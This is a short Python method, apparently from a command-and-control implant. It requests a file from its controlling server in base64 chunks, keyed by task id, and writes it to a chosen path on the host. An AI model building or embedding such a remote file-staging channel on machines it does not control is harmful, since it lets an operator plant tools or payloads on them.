    def upload(self, task_id, file, remote_path):
        total_chunks = 1
        chunk_num = 0
        with open(remote_path, "wb") as f:
            while (chunk_num < total_chunks):
                data = { 
                    "action": "post_response",
                    "responses": [
                        {
                            "upload": {
                                "chunk_size": 51200,
                                "file_id": file, 
                                "chunk_num": chunk_num,
                                "full_path": remote_path
                            },
                            "task_id": task_id
                        }
                    ] 
                }
                response = self.postMessageAndRetrieveResponse(data)
                chunk = response["responses"][0]
                chunk_num+=1
                total_chunks = chunk["total_chunks"]
                f.write(base64.b64decode(chunk["chunk_data"]))
